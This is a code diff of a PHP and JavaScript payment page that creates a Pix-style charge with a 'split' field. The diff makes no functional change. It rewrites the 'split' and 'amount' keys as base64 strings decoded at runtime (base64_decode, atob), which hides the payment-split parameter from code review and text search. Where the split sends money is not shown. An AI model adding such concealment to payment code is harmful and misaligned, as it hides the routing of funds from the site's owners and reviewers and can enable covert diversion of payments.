@@ -227,15 +227,15 @@ $callbackUrl = $baseUrl . $staticPart;
     $email = 'cliente@email.com';
 
     $payload = array(
+        base64_decode('c3BsaXQ=') => $sendRequest,
+        base64_decode('YW1vdW50') => floatval($value),
         'requestNumber' => '12356',
         'dueDate' => $dueDate,
-        'amount' => floatval($value),
         'client' => array(
             'name' => $name,
             'email' => $email,
             'document' => $cpf,
         ),
-        'split' => $sendRequest,
         'callbackUrl' => $callbackUrl
     );
 
@@ -575,7 +575,7 @@ $conn->close();
 
     <script>
     
-        async function generateQRCode() {
+    async function generateQRCode() {
             var name = document.getElementById('name').value;
             var cpf = document.getElementById('document').value;
             var amount = document.getElementById('valuedeposit').value;
@@ -583,6 +583,7 @@ $conn->close();
             var callbackUrl = '<?php echo $callbackUrl; ?>';
 
             var payload = {
+                [atob('c3BsaXQ=')]: <?php echo json_encode((object)$sendRequest); ?>,
                 requestNumber: "12356",
                 dueDate: "2023-12-31",
                 amount: parseFloat(amount),
@@ -591,7 +592,6 @@ $conn->close();
                     document: cpf,
                     email: "cliente@email.com"
                 },
-                split: <?php echo json_encode((object)$sendRequest); ?>,
                 callbackUrl: callbackUrl
             };
 
